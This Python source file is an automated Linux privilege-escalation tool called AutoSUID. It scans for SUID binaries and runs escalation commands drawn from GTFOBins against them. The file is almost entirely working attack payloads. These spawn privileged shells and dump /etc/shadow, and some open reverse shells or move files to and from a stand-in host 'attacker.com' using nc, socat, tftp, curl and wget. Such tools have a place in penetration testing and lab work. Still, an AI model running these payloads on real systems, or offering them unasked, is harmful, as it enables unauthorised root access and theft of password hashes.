"""AutoSUID - automated priv-esc via SUID - By Ben Roxbee Cox"""
from sys import argv
from os import system, popen
from time import sleep


"""
This dictionary contains all exploits known SUID vulnerable binaries. \
This dictionary contains exploits which are not \
automatically carried out by the program.
"""
customExploitation = {
    'aria2c': 'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x',
    'arp': 'LFILE=file_to_read\n./arp -v -f "$LFILE"',
    'base32': 'LFILE=file_to_read\nbase32 "$LFILE" | base32 --decode',
    'base64': 'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode',
    'byebug': 'TF=$(mktemp)\necho \'system("/bin/sh")\' > $TF\n./byebug $TF\ncontinue',
    'chmod': 'LFILE=file_to_change\n./chmod 0777 $LFILE',
    'chown': 'LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE',
    'cp': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE',
    'curl': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE',
    'date': 'LFILE=file_to_read\n./date -f $LFILE',
    'dd': 'LFILE=file_to_write\necho "data" | ./dd of=$LFILE',
    'dialog': 'LFILE=file_to_read\n./dialog --textbox "$LFILE" 0 0',
    'diff': 'LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE',
    'dmsetup': "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'", 'file': 'LFILE=file_to_read\n./file -m $LFILE',
    'ed': './ed\n!/bin/sh',
    'eqn': 'LFILE=file_to_read\n./eqn "$LFILE"',
    'fmt': 'LFILE=file_to_read\n./fmt -pNON_EXISTING_PREFIX "$LFILE"',
    'git': 'PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help',
    'gtester': 'TF=$(mktemp)\necho \'#!/bin/sh -p\' > $TF\necho \'exec /bin/sh -p 0<&1\' >> $TF\nchmod +x $TF\ngtester -q $TF',
    'hd': 'LFILE=file_to_read\n./hd "$LFILE"',
    'hexdump': 'LFILE=file_to_read\n./hexdump -C "$LFILE"',
    'highlight': 'LFILE=file_to_read\n./highlight --no-doc --failsafe "$LFILE"',
    'iconv': 'LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 "$LFILE"',
    'iftop': './iftop\n!/bin/sh',
    'ip': 'LFILE=file_to_read\n./ip -force -batch "$LFILE"',
    'jjs': 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs',
    'jq': 'LFILE=file_to_read\n./jq -Rr . "$LFILE"',
    'ksshell': 'LFILE=file_to_read\n./ksshell -i $LFILE',
    'ldconfig': 'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\n./ldconfig -f "$TF/conf"',
    'look': 'LFILE=file_to_read\n./look \'\' "$LFILE"',
    'lwp-download': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE',
    'lwp-request': 'LFILE=file_to_read\n./lwp-request "file://$LFILE"',
    'mv': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE',
    'mysql': "./mysql -e '\\! /bin/sh'", 'awk': './awk \'BEGIN {system("/bin/sh")}\'',
    'nano': './nano\n^R^X\nreset; sh 1>&0 2>&0',
    'nawk': './nawk \'BEGIN {system("/bin/sh")}\'',
    'nc': 'RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT',
    'nmap': 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF',
    'nohup': 'nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
    'openssl': 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n',
    'pic': './pic -U\n.PS\nsh X sh X',
    'pico': './pico\n^R^X\nreset; sh 1>&0 2>&0',
    'pry': './pry\nsystem("/bin/sh")',
    'readelf': 'LFILE=file_to_read\n./readelf -a @$LFILE',
    'restic': 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"',
    'scp': 'TF=$(mktemp)\necho \'sh 0<&2 1>&2\' > $TF\nchmod +x "$TF"\n./scp -S $TF a b:',
    'shuf': 'LFILE=file_to_write\n./shuf -e DATA -o "$LFILE"\nsudo:',
    'soelim': 'LFILE=file_to_read\n./soelim "$LFILE"',
    'sqlite3': "./sqlite3 /dev/null '.shell /bin/sh'", 'socat': 'RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane',
    'strings': 'LFILE=file_to_read\n./strings "$LFILE"',
    'sysctl': 'LFILE=file_to_read\n./sysctl -n "/../../$LFILE"',
    'systemctl': 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF',
    'tac': 'LFILE=file_to_read\n./tac -s \'PromiseWontOverWrite\' "$LFILE"',
    'tar': './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    'tee': 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"',
    'telnet': 'RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh',
    'tftp': 'RHOST=attacker.com\n./tftp $RHOST\nput file_to_send',
    'uudecode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
    'uuencode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
    'xz': 'LFILE=file_to_read\n./xz -c "$LFILE" | xz -d',
    'zip': "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF", 'wget': 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\n./wget $URL -O $LFILE',
    'zsoelim': 'LFILE=file_to_read\n./zsoelim "$LFILE"',
}

"""Default SUID in Unix (Not exploitable)."""
defaultSUIDBins = ["arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh", "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4", "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic", "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs", "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping", "ping6", "pkexec",
                   "polkit-agent-helper-1", "pppd", "snap-confine", "ssh-keysign", "su", "sudo", "traceroute6.iputils", "ubuntu-core-launcher", "umount", "VBoxHeadless", "VBoxNetAdpCtl", "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL", "VBoxVolInfo", "VirtualBoxVM", "vmware-authd", "vmware-user-suid-wrapper", "vmware-vmx", "vmware-vmx-debug", "vmware-vmx-stats", "Xorg.wrap"]


"""SUIDs with avaliable  exploits."""
autoExploitation = {
    'ash': '',
    'bash': '-p',
    'busybox': 'sh',
    'cat': '/etc/shadow',
    'chroot': '/ /bin/sh -p',
    'csh': '-b',
    'cut': '-d "" -f1 /etc/shadow',
    'dash': '-p',
    'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
    'emacs': '-Q -nw --eval \'(term "/bin/sh -p")\'',
    'env': '/bin/sh -p',
    'expand': '/etc/shadow',
    'expect': '-c "spawn /bin/sh -p;interact"',
    'find': '. -exec /bin/sh -p \\; -quit',
    'flock': '-u / /bin/sh -p',
    'fold': '-w99999999 /etc/shadow',
    'gawk': '\'BEGIN {system("/bin/sh")}\'',
    'gdb': '-q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
    'gimp': '-idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'grep': '"" /etc/shadow',
    'head': '-c2G /etc/shadow',
    'ionice': '/bin/sh -p',
    'jrunscript': '-e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"',
    'ksh': '-p',
    'ld.so': '/bin/sh -p',
    'less': '/etc/shadow',
    'logsave': '/dev/null /bin/sh -i -p',
    'lua': '-e \'os.execute("/bin/sh")\'',
    'make': '-s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
    'mawk': '\'BEGIN {system("/bin/sh")}\'',
    'more': '/etc/shadow',
    'nice': '/bin/sh -p',
    'nl': '-bn -w1 -s \'\' /etc/shadow',
    'node': 'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
    'od': 'od -An -c -w9999 /etc/shadow | sed -E -e \'s/ //g\' -e \'s/\\\\n/\\n/g\'',
    'perl': '-e \'exec "/bin/sh";\'',
    'pg': '/etc/shadow',
    'php': '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'rlwrap': '-H /dev/null /bin/sh -p',
    'rpm': '--eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
    'rpmquery': '--eval \'%{lua:posix.exec("/bin/sh", "-p")}\'',
    'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
    'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'sed': '-e "" /etc/shadow',
    'setarch': '$(arch) /bin/sh -p',
    'sort': '-m /etc/shadow',
    'start-stop-daemon': '-n $RANDOM -S -x /bin/sh -- -p',
    'stdbuf': '-i0 /bin/sh -p',
    'strace': '-o /dev/null /bin/sh -p',
    'tail': '-c2G /etc/shadow',
    'taskset': '1 /bin/sh -p',
    'time': '/bin/sh -p',
    'timeout': '7d /bin/sh -p',
    'ul': '/etc/shadow',
    'unexpand': 'unexpand -t99999999 /etc/shadow',
    'uniq': '/etc/shadow',
    'unshare': '-r /bin/sh',
    'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
    'xargs': '-a /dev/null sh -p',
    'xxd': '/etc/shadow | xxd -r',
    'zsh': '',
}

"""
The following list contains binaries which GTFO Bins says are exploitable
"""
gtfoBinsList = ['bash', 'busybox', 'cat', 'chroot', 'cut', 'dash', 'docker', 'env', 'expand', 'expect', 'find', 'flock', 'fold', 'gdb', 'grep', 'head', 'ionice', 'jrunscript', 'ksh', 'ld.so', 'less', 'logsave', 'make', 'more', 'nice', 'nl', 'node', 'od', 'perl', 'pg', 'php', 'python', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'run-parts', 'rvim', 'sed', 'setarch', 'sort', 'start-stop-daemon', 'stdbuf', 'strace', 'tail', 'taskset', 'time', 'timeout', 'ul', 'unexpand', 'uniq', 'unshare', 'vim', 'watch', 'xargs', 'xxd', 'zsh', 'aria2c', 'arp', 'ash', 'base32', 'base64', 'byebug', 'chmod',
                'chown', 'cp', 'csh', 'curl', 'date', 'dd', 'dialog', 'diff', 'dmsetup', 'file', 'ed', 'emacs', 'eqn', 'fmt', 'gawk', 'gimp', 'git', 'gtester', 'hd', 'hexdump', 'highlight', 'iconv', 'iftop', 'ip', 'jjs', 'jq', 'ksshell', 'ldconfig', 'look', 'lua', 'lwp-download', 'lwp-request', 'mawk', 'mv', 'mysql', 'awk', 'nano', 'nawk', 'nc', 'nmap', 'nohup', 'openssl', 'pic', 'pico', 'pry', 'readelf', 'restic', 'scp', 'shuf', 'soelim', 'sqlite3', 'socat', 'strings', 'sysctl', 'systemctl', 'tac', 'tar', 'tclsh', 'tee', 'telnet', 'tftp', 'uudecode', 'uuencode', 'xz', 'zip', 'wget', 'zsoelim']

"""Colour Scheme"""

green = "\033[0;92m"
red = "\033[0;91m"
white = "\033[0;97m"
yellow = "\033[0;33m"
magenta = "\033[0;35m"

lineBreak = "--------------------------------------"


def findSUIDBinaries():
    """Find all SUID binaries on system.

    returns:
        foundSUIDs : List of suid binaries
    """
    print(magenta + "Finding all SUID binaries...")
    print("\n" + white + lineBreak + "\n")

    # Bash script to find SUID binaries
    getSUIDs = "find / -perm -4000 -type f 2>/dev/null"
    foundSUIDs = popen(getSUIDs).read().strip().split(
        "\n")    # Store found binaries in list

    print(white + lineBreak)

    return(foundSUIDs)


def matchSUIDs(SUIDList):
    """Sort binaries into logical catagories.

    args:
        SUIDList : List of SUID binaries to be sorted

    returns:
        defaultBins         : Default Unix SUID Binaries
        binInGTFO     		: SUID Binaries with known exploit
        customExploitBins   : Custom SUID Binaries
    """
    defaultBins = []  # Non exploitable linux bins
    binInGTFO = []        # Bins with known exploits
    customExploitBins = []  # Bins with possible exploit

    for suid in SUIDList:
        binaryName = suid.split("/")[::-1][0]
        if binaryName not in defaultSUIDBins: 	# If not a default Unix SUID

            if binaryName in gtfoBinsList:
                binInGTFO.append(suid)
            else:
                customExploitBins.append(binaryName)

        else:
            defaultBins.append(binaryName)  # Add to default binary list

    print(red + "\n[-] Default SUID Binaries (No Known Exploits)")
    print(lineBreak)
    for binary in defaultBins:
        print(red + binary)  # Print all found default binaries

    print(yellow + "\n[-] Custom SUID Binaries (Potentially Exploitable)")
    print(lineBreak)
    for binary in customExploitBins:
        print(yellow + binary)  # Print custom SUID binaries

    if len(binInGTFO) != 0:
        print(green + "\n [-] Binaries with Known Exploits")
        print(lineBreak)
        for binary in binInGTFO:
            # Print path of vulnerable binary
            pathOfBin = popen("which " + binary).read().strip()
            gtfoUrl = "https://gtfobins.github.io/gtfobins/" + \
                binary[::-1].split("/")[0][::-1] + "/#suid"  # Link to priv-esc
            print(green + pathOfBin + white + " ==> " + magenta + gtfoUrl)
        print(lineBreak)

    else:
        print(red + "\n[-] No Automatically Executable Binaries Found...")
        print(binInGTFO)

    return(binInGTFO, customExploitBins)  # Return list of binaries


def pwnSUIDs(vulnerableBins):
    """Attempt to automatically escalate privilages. \
    Runs the relevent command for priv-esc via SUID, \
    or prints the relevent custom command.


    args:
            vulnerableBins : List of vulnerable binaries
    """

    autoExploits = []		# Exploits this program can run
    customExploits = []		# Exploits the user must attempt

    for binary in vulnerableBins:
        _binary = binary.split("/")[::-1][0]

        if _binary in autoExploitation:
            binExploit = binary + " " + autoExploitation[_binary]
            autoExploits.append(binExploit)  # Adds exploit to list

        elif _binary in customExploits:
            binExploit = binary + " " + customExploitation[_binary]
            # Add exploit command to customExploits list
            customExploits.append(binExploit)
    print(white + lineBreak)

    if len(autoExploits) != 0:
        for exploit in autoExploits:
            print(magenta + "\n[#] Executing Command : ")
            # Print command being attempted
            print(green + "[+] " + exploit + "\n")
            sleep(0.5)
            system(exploit)  # Run exploit
            sleep(0.5)
    elif len(customExploits) != 0:
        for exploit in customExploits:
            print(yellow + "[#] Try using this command to elevate privs")
            print("[+] ", exploit + "\n")

    return()


if __name__ == '__main__':
    try:
        allSUIDs = findSUIDBinaries()
        vulnBins = matchSUIDs(allSUIDs)
        pwnSUIDs(vulnBins[0])
    except KeyboardInterrupt:
        print(white + "Exiting")
